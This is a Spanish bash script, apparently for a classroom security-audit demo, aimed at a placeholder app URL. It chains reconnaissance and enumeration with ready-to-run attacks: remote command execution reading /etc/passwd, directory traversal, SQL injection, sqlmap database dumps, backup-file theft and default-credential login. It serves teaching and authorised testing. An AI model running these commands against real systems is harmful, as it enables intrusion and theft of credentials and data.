#!/bin/bash

# SCRIPT DE DEMOSTRACIÓN PARA AUDITORÍA INFORMÁTICA
# Ejecutar desde Parrot Security OS
# Reemplaza "tu-app.koyeb.app" con la URL real de tu aplicación

echo "===========================================" 
echo "AUDITORÍA INFORMÁTICA - DEMOSTRACIÓN PRÁCTICA"
echo "==========================================="
echo ""

TARGET_URL="tu-app.koyeb.app"
echo "TARGET: $TARGET_URL"
echo ""

echo "1. FASE DE RECONOCIMIENTO"
echo "========================="
echo "Ejecutando Nmap para reconocimiento de servicios..."
nmap -sS -sV -O $TARGET_URL

echo ""
echo "Recopilando información WHOIS..."
whois $TARGET_URL

echo ""
echo "2. FASE DE EXPLORACIÓN"
echo "====================="
echo "Escaneando puertos específicos..."
nmap -p 80,443,8080,8443 -sV $TARGET_URL

echo ""
echo "3. FASE DE ENUMERACIÓN"
echo "====================="
echo "Enumerando directorios con Gobuster..."
gobuster dir -u https://$TARGET_URL -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak,sql,csv

echo ""
echo "Enumerando con Dirb..."
dirb https://$TARGET_URL /usr/share/wordlists/dirb/common.txt

echo ""
echo "4. FASE DE OBTENCIÓN DE ACCESO"
echo "=============================="
echo "Probando Information Disclosure..."
curl -s https://$TARGET_URL/debug/server-info | jq .

echo ""
echo "Probando RCE (Remote Code Execution)..."
curl -s "https://$TARGET_URL/admin/execute?cmd=whoami"

echo ""
echo "Probando Directory Traversal..."
curl -s "https://$TARGET_URL/admin/file?filename=../../../etc/passwd"

echo ""
echo "Probando SQL Injection..."
curl -s "https://$TARGET_URL/admin/user/1' UNION SELECT version()--"

echo ""
echo "Accediendo a archivos de backup..."
curl -s https://$TARGET_URL/backup/database.sql
curl -s https://$TARGET_URL/backup/config.bak
curl -s https://$TARGET_URL/backup/users.csv

echo ""
echo "Probando credenciales débiles..."
curl -X POST -d "username=admin&password=admin" https://$TARGET_URL/admin/login

echo ""
echo "5. ANÁLISIS DE VULNERABILIDADES"
echo "==============================="
echo "Ejecutando Nikto..."
nikto -h https://$TARGET_URL

echo ""
echo "Para análisis completo con Nessus:"
echo "1. Abrir Nessus Web UI"
echo "2. Crear nuevo scan"
echo "3. Target: $TARGET_URL"
echo "4. Ejecutar Basic Network Scan"

echo ""
echo "Para análisis con OpenVAS:"
echo "1. Abrir OpenVAS (GVM)"
echo "2. Crear nuevo target: $TARGET_URL"
echo "3. Ejecutar Full and fast scan"

echo ""
echo "6. EXPLOTACIÓN CON METASPLOIT"
echo "============================="
echo "Para usar Metasploit:"
echo "msfconsole"
echo "search http_version"
echo "use auxiliary/scanner/http/http_version"
echo "set RHOSTS $TARGET_URL"
echo "run"

echo ""
echo "Para explotar RCE manualmente:"
echo "curl \"https://$TARGET_URL/admin/execute?cmd=id\""
echo "curl \"https://$TARGET_URL/admin/execute?cmd=uname -a\""
echo "curl \"https://$TARGET_URL/admin/execute?cmd=cat /etc/passwd\""

echo ""
echo "7. ANÁLISIS CON SQLMAP"
echo "====================="
echo "sqlmap -u \"https://$TARGET_URL/admin/user/1\" --dbs --batch"
echo "sqlmap -u \"https://$TARGET_URL/admin/user/1\" --dump --batch"

echo ""
echo "==========================================="
echo "DEMOSTRACIÓN COMPLETADA"
echo "Revisar logs y generar reporte detallado"
echo "==========================================="
